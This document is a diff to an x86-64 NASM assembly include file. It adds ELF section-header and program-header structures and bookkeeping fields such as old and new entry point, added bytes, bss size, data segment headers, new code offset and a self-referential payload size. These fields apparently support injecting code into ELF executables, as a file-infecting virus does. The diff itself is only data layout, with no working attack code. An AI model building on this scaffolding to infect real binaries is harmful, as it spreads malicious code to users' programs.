@@ -67,6 +67,7 @@
 
 %define NAME_SIZE 512
 %define CONTENT_SIZE 128
+%define PAYLOAD_SIZE end - _start
 
 %define DIRENT_SIZE 1024
 struc	linux_dirent
@@ -122,11 +123,47 @@ struc ehdr
 	.e_shstrndx		resw	1
 endstruc
 
+%define SHDR_SIZE	64
+struc shdr
+	.sh_name		resd	1
+	.sh_type		resd	1
+	.sh_flags		resq	1
+	.sh_addr		resq	1
+	.sh_offset		resq	1
+	.sh_size		resq	1
+	.sh_link		resd	1
+	.sh_info		resd	1
+	.sh_addralign	resq	1
+	.sh_entsize		resq	1
+endstruc
+
+%define PHDR_SIZE	56
+struc phdr
+	.p_type			resd 1
+	.p_flags		resd 1
+	.p_offset		resq 1
+	.p_vaddr		resq 1
+	.p_paddr		resq 1
+	.p_filesz		resq 1
+	.p_memsz		resq 1
+	.p_align		resq 1
+endstruc
+
 %define ELF_STRUC_SIZE 1024
 struc elf_struc
-	.stat			resb	STAT_STRUC_SIZE
-	.path			resq	1
-	.fd				resd	1
-	.ptr			resq	1
-	.ehdr			resq	1
+	.stat				resb	STAT_STRUC_SIZE
+	.path				resq	1
+	.fd					resd	1
+	.fd2				resd	1
+	.ptr				resq	1
+	.ptr_end			resq	1
+	.ehdr				resq	1
+	.old_entry			resq	1
+	.new_entry			resq	1
+	.bits_added			resq	1
+	.bss_size			resq	1
+	.data_shdr			resq	1
+	.data_phdr			resq	1
+	.shdr_names			resq	1
+	.new_code_offset	resq	1
 endstruc
